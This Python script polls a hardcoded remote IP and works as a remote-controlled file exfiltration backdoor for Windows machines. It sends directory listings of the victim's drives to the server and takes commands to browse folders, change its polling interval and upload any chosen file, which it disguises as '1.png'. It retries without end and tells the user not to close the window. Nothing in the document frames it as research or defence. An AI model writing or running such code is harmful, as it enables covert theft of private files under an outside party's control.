import requests
from threading import Timer
import datetime
import os
import json

# baseUrl = "http://localhost:8100"
baseUrl = "http://114.116.250.115:8100"
currentPath = 'c:/'
currentFileList = []
currentFileListIndex = 0
tt = 5
maxUpload = 0

# def checkConect() :
    # url = baseUrl + "/check"
    # res=requests.request("get",url)
    # res.encoding = 'utf-8'
    
    # print (res.text)

    # if res.text == "1":
    #     checkPath()
    # else:
    #     print('TimeNow:%s' % (datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    # t = Timer(2, printHello)
    # t.start()

def checkPath(p = 'c:/') :
    global tt
    global currentPath
    global currentFileList
    url = baseUrl + "/next"
    headers = {'Content-Type': 'application/json'}
    try:
        if os.path.exists(p):
            currentPath = p
        else:
            currentPath = 'c:/'

        # print ("checkpath " + currentPath)
        fileList = os.listdir(currentPath)
        # print (fileList)
        data = '{"data": "' + (','.join(fileList)) + '", "rootPath": "' + (currentPath) + '"}'
        data = data.encode("utf-8")

        # print (data)
        
        res = requests.post(url, data = data, headers = headers)
        res.encoding = "utf-8"
        # print (res.text)
        info = res.text.split(">")

        if info[0] == "c":
            checkPath(info[1])
        elif info[0] == "e":
            checkPath('e:/')
        elif info[0] == "x":
            checkPath('c:/')
        elif info[0] == "f":
            checkPath('f:/')
        elif info[0] == "d":
            checkPath('d:/')
        elif info[0] == "g":
            checkPath('g:/')
        elif info[0] == "h":
            checkPath('h:/')
        elif info[0] == "s":
            # print("save " + info[1])
            upload(info[1])
        # elif info[0] == "a":
        #     currentFileList = os.listdir(currentPath)
        #     currentFileListIndex = 0
        #     all()
        elif info[0] == "+":
            tt = 600
            t = Timer(tt, checkPath)
            t.start()
        elif info[0] == "-":
            tt = 60
            t = Timer(tt, checkPath)
            t.start()
        elif info[0] == ".":
            tt = 10
            t = Timer(tt, checkPath)
            t.start()
        else:
            t = Timer(tt, checkPath)
            t.start()
    except Exception as e:
        # print ('res Error' + e)
        # t = Timer(60 * 10, checkPath)
        t = Timer(tt, checkPath)
        t.start()

def upload(str = "") :
    # print("save " + str)
    if str == "":
        checkPath(currentPath)
    else:
        try:
            url = baseUrl + "/save"
            files = {'img': ('1.png', open(str, 'rb'), 'image/png', {})}
            res=requests.request("POST",url, data=None, files=files)
        except:
            notice(str+"_upload_failed")
            # print(str+"_upload_failed")
            checkPath(currentPath)
        else:
            checkPath(currentPath)

# def all() : 
#     global maxUpload
#     global currentPath
#     global currentFileList
#     global currentFileListIndex
#     print("all")
#     if maxUpload < 10:
#         path = currentPath + currentFileList[currentFileListIndex]
#         if path
#         upload()



def notice(str) :
    url = baseUrl + "/log?msg=" + str
    res=requests.get(url)

print("connecting...,please do not shut down the window!")

checkPath()